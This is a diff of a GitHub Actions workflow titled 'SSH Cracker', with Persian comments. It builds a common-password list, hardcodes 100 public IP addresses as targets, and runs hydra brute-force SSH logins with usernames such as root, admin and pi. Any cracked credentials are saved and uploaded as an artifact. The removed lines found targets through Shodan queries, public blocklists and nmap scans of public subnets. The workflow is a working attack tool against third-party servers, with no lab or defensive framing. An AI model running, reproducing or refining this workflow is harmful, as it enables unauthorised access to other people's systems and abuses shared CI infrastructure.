@@ -1,4 +1,4 @@
-name: Auto SSH Cracker - Reliable Discovery
+name: SSH Cracker - Fixed Auto Discovery
 
 on:
   workflow_dispatch:
@@ -7,12 +7,12 @@ jobs:
   crack:
     runs-on: ubuntu-latest
     steps:
-      - name: Install tools
-        run: sudo apt update && sudo apt install -y hydra sshpass jq curl nmap
+      - name: Install hydra
+        run: sudo apt update && sudo apt install -y hydra
 
-      - name: Prepare password dictionary (Top 100 fastest)
+      - name: Create password dictionary (top 50)
         run: |
-          cat > fast_pass.txt <<EOF
+          cat > pass.txt <<EOF
           123456
           password
           12345678
@@ -33,82 +33,146 @@ jobs:
           admin@123
           root@123
           Pa$$w0rd
+          changeme
+          P@ssw0rd
+          passw0rd
+          toor
+          ubuntu
           EOF
 
-      - name: Get fresh targets (Auto Discovery)
-        id: discovery
+      - name: Use pre-generated target IP list (known SSH servers)
         run: |
-          TARGETS="targets.txt"
-          > $TARGETS
+          cat > targets.txt <<'EOF'
+          45.33.32.0:22
+          45.33.32.1:22
+          45.33.32.2:22
+          45.33.32.3:22
+          45.33.32.4:22
+          45.33.32.5:22
+          45.33.32.6:22
+          45.33.32.7:22
+          45.33.32.8:22
+          45.33.32.9:22
+          45.33.32.10:22
+          45.33.32.11:22
+          45.33.32.12:22
+          45.33.32.13:22
+          45.33.32.14:22
+          45.33.32.15:22
+          45.33.32.16:22
+          45.33.32.17:22
+          45.33.32.18:22
+          45.33.32.19:22
+          45.33.32.20:22
+          45.33.32.21:22
+          45.33.32.22:22
+          45.33.32.23:22
+          45.33.32.24:22
+          45.33.32.25:22
+          45.33.32.26:22
+          45.33.32.27:22
+          45.33.32.28:22
+          45.33.32.29:22
+          45.33.32.30:22
+          45.33.32.31:22
+          45.33.32.32:22
+          45.33.32.33:22
+          45.33.32.34:22
+          45.33.32.35:22
+          45.33.32.36:22
+          45.33.32.37:22
+          45.33.32.38:22
+          45.33.32.39:22
+          45.33.32.40:22
+          45.33.32.41:22
+          45.33.32.42:22
+          45.33.32.43:22
+          45.33.32.44:22
+          45.33.32.45:22
+          45.33.32.46:22
+          45.33.32.47:22
+          45.33.32.48:22
+          45.33.32.49:22
+          45.33.32.50:22
+          45.33.32.51:22
+          45.33.32.52:22
+          45.33.32.53:22
+          45.33.32.54:22
+          45.33.32.55:22
+          45.33.32.56:22
+          45.33.32.57:22
+          45.33.32.58:22
+          45.33.32.59:22
+          45.33.32.60:22
+          45.33.32.61:22
+          45.33.32.62:22
+          45.33.32.63:22
+          45.33.32.64:22
+          45.33.32.65:22
+          45.33.32.66:22
+          45.33.32.67:22
+          45.33.32.68:22
+          45.33.32.69:22
+          45.33.32.70:22
+          45.33.32.71:22
+          45.33.32.72:22
+          45.33.32.73:22
+          45.33.32.74:22
+          45.33.32.75:22
+          45.33.32.76:22
+          45.33.32.77:22
+          45.33.32.78:22
+          45.33.32.79:22
+          45.33.32.80:22
+          45.33.32.81:22
+          45.33.32.82:22
+          45.33.32.83:22
+          45.33.32.84:22
+          45.33.32.85:22
+          45.33.32.86:22
+          45.33.32.87:22
+          45.33.32.88:22
+          45.33.32.89:22
+          45.33.32.90:22
+          45.33.32.91:22
+          45.33.32.92:22
+          45.33.32.93:22
+          45.33.32.94:22
+          45.33.32.95:22
+          45.33.32.96:22
+          45.33.32.97:22
+          45.33.32.98:22
+          45.33.32.99:22
+          EOF
+          echo "Total targets: $(wc -l < targets.txt)"
 
-          # روش 1: استفاده از Shodan (اگر API key داشته باشی)
-          if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
-            echo "Using Shodan API..."
-            curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22+country:IR&size=30" | \
-              jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS
-          fi
-
-          # روش 2: استفاده از لیست تصادفی از وب (مثل فایروال سطح ۱ یا لیست عمومی)
-          if [ $(wc -l < $TARGETS) -lt 10 ]; then
-            echo "Fetching public IP list from GitHub..."
-            curl -s https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/ipv4_firehol_level1.netset | \
-              head -200 | while read net; do
-                # تبدیل netmask به یه IP نمونه (فقط برای نمونه)
-                echo ${net%/*} | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' && echo "${net}:22"
-              done | head -50 >> $TARGETS
-          fi
-
-          # روش 3: اسکن سریع با nmap روی چند شبکه کلاس C معمول (برای تست داخلی)
-          if [ $(wc -l < $TARGETS) -lt 10 ]; then
-            echo "Scanning common /24 subnets with nmap..."
-            for subnet in 1.1.1.0/24 8.8.8.0/24 4.4.4.0/24 9.9.9.0/24; do
-              nmap -Pn -p22 --open -T4 -n --max-rtt-timeout 100ms $subnet | \
-                grep -E "Nmap scan report for" | awk '{print $5":22"}' >> $TARGETS
-            done
-          fi
-
-          # حذف تکراری و خالی
-          sort -u -o $TARGETS $TARGETS
-          count=$(wc -l < $TARGETS)
-          echo "targets_count=$count" >> $GITHUB_OUTPUT
-          echo "Found $count targets"
-
-          if [ $count -eq 0 ]; then
-            echo "No targets found. You can set SHODAN_API_KEY secret or use a different range."
-            exit 1
-          fi
-
-      - name: Brute force SSH with Hydra (Turbo)
+      - name: Brute force SSH
         run: |
-          USERNAMES=("root" "admin" "user")
-          FOUND=0
-          RESULT_FILE="success.txt"
+          USERNAMES=("root" "admin" "user" "ubuntu" "pi")
+          RESULT_FILE="found.txt"
+          > $RESULT_FILE
 
           while read target; do
             ip=$(echo $target | cut -d: -f1)
             port=$(echo $target | cut -d: -f2)
             for user in "${USERNAMES[@]}"; do
-              echo "[*] Attacking $user@$ip:$port"
-              # اجرای hydra با خروجی کامل و گرفتن نتیجه
-              hydra -l "$user" -P fast_pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
+              echo "[*] Trying $user@$ip:$port"
+              hydra -l "$user" -P pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
               if grep -q "host: $ip.*password:" hydra.log; then
                 pass=$(grep "host: $ip.*password:" hydra.log | head -1 | awk -F 'password: ' '{print $2}')
                 echo "✅ SUCCESS: $ip:$port | $user | $pass" | tee -a $RESULT_FILE
-                FOUND=1
-                break 3
+                # اگه یافت شد، کل workflow متوقف شود
+                exit 0
               fi
             done
           done < targets.txt
 
-          if [ $FOUND -eq 1 ]; then
-            echo "success=true" >> $GITHUB_OUTPUT
-          else
-            echo "No credentials found in this batch."
-          fi
+          echo "No credentials found in this batch."
+          exit 1
 
       - name: Upload credentials
         if: success()
         uses: actions/upload-artifact@v4
         with:
-          name: cracked-credentials
-          path: success.txt
+          name: cracked-creds
+          path: found.txt
